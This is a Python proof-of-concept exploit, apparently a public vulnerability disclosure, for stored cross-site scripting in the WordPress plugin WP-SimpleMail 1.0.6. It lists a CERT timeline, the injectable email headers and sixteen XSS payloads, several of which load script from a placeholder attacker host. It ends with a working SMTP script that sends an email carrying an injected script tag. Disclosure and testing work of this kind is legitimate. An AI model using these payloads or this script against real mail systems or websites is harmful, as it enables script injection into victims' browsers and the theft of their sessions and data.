#!/usr/bin/python

'''

Author: loneferret of Offensive Security
Product: SimpleMail 
Version: 1.0.6 (free version)
Vendor Site: http://codecanyon.net/item/wp-simplemail/1130008?ref=tinsley
Software Download: http://wordpress.org/extend/plugins/wp-simplemail/

Timeline:
29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
23 Jul 2012: Update from CERT: No response from vendor
08 Aug 2012: Public Disclosure

Installed On: Ubuntu LAMP 8.04
Wordpress: 3.3.1
Client Test OS: MAC OS Lion
Browser Used: Firefox 12


Injection Points: To, From, Date, Subject
Injection Payload(s):
1: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{} 
2: <SCRIPT>alert('XSS')</SCRIPT>
3: <SCRIPT SRC=http://attacker/xss.js></SCRIPT>
4: <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
5: <IFRAME SRC="javascript:alert('XSS');"></IFRAME> 
6: <SCRIPT SRC="http://attacker/xss.jpg"></SCRIPT>
7: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
8: <SCRIPT SRC=//attacker/.j> 
9: <<SCRIPT>alert("XSS");//<</SCRIPT>
10: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
11: <SCRIPT a=">" SRC="http://attacker/xss.js"></SCRIPT>
12: <SCRIPT ="blah" SRC="http://attacker/xss.js"></SCRIPT>
13: <SCRIPT a="blah" '' SRC="http://attacker/xss.js"></SCRIPT>
14: <SCRIPT "a='>'" SRC="http://attacker/xss.js"></SCRIPT>
15: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://attacker/xss.js"></SCRIPT>
16: <SCRIPT a=">'>" SRC="http://attacker/xss.js"></SCRIPT>

'''


import smtplib, urllib2
   
payload = """<SCRIPT>alert('XSS')</SCRIPT>"""
   
def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local" + payload + "\n"
        msg += "To: victim@victim.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: Offensive Security\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()
   
username = "hacker@offsec.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.84.171"
   
print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)